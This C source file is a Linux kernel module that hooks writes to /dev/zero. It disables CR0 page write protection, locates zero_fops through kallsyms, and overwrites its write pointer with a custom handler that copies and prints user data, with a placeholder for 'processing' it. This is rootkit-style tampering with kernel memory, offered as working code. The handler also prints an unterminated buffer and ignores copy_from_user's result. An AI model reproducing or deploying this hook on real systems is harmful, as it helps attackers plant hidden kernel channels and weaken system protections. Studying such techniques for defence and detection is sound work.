#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/uio.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>

unsigned long *zero_foperations;
unsigned long *back_zero_foperations; 
unsigned long *write_zerop; 

static void enable_page_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if((value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
}

static void disable_page_protection(void)
{
    unsigned long value;
    asm volatile("mov %%cr0, %0" : "=r" (value));

    if(!(value & 0x00010000))
        return;

    asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
}

ssize_t ye_write_null(struct file *file, const char __user *buf,
			                        size_t count, loff_t *ppos)
{
    unsigned char *takeo; 

    printk("Inside the hook.. %ld is the count\n",count);
    if (count < 64 && count > 8)
    {
        takeo = kmalloc(count, GFP_KERNEL);    
        copy_from_user(takeo, buf, count);
        printk(" --> %s", takeo);

        //
        // data unpacked here.. 
        //    processed
        //   

        kfree(takeo);   
    }

    return count;
}
 
int init_module(void)
{
    int x;

    // /dev/zero is setup via the zero_fops file_operations structure
    // containing pointers to functions for different operations 
    // (e.g read/write/seek etc)
    zero_foperations = (void *)kallsyms_lookup_name("zero_fops");

    // backup the original zero_fops
    back_zero_foperations = kmalloc(sizeof(struct file_operations), GFP_KERNEL);
    memcpy(back_zero_foperations, zero_foperations, sizeof(struct file_operations)); 

    // write_zero alias to write_null
    write_zerop = (void *)kallsyms_lookup_name("write_null");
 
    // locate pointer to write_zero/write_null in zero_fops file_operations structure
    // rather than rely on a hard coded offset
    for(x = 0; x < (sizeof(struct file_operations) / sizeof(unsigned long)); x++)
    {
        if(*(zero_foperations + x) == write_zerop)
        {
            disable_page_protection();
            *(zero_foperations + x) = &ye_write_null;
            enable_page_protection();
        }
    }
    return 0;
}

void cleanup_module(void)
{      
    disable_page_protection();
    memcpy(zero_foperations, back_zero_foperations, sizeof(struct file_operations)); 
    enable_page_protection();
    kfree(back_zero_foperations); 
}

MODULE_AUTHOR("linuxthor");
MODULE_LICENSE("GPL");
